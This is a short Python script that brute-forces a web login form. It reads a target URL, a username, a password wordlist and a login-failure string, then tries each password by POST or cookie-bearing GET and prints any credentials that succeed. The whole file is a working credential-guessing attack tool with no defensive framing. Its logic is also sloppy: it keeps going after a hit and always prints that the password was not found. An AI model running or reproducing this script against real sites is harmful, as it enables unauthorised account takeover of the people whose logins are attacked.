## Run with root privileges(sudo)

import requests
from termcolor import colored



url = input("[+] Enter page URL: ")
username = input("[+] Enter the Username for the Account to Bruteforce: ")
password_file = input("[+] Enter password file to use: ")
login_failed_string = input("[+] Enter String that occurs when login Falis: ")
cookie_value = input("Enter Cookie Value(Optional): ")




def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(("Trying: " + password), "red"))
		data = {"username": username, "password":password, "Login":"submit"}
		if cookie_value != "":
			response = requests.get(url, params={"username": username, "password":password, "Login":"Login"}, cookies = {"Cookie": cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(("[+] Found Username: ==> " + username), "blue"))
			print(colored(("[+] Found Password: ==> " + password), "blue"))




with open(password_file, "r") as passwords:
	cracking(username,url)

print("[!!] Password Not in List")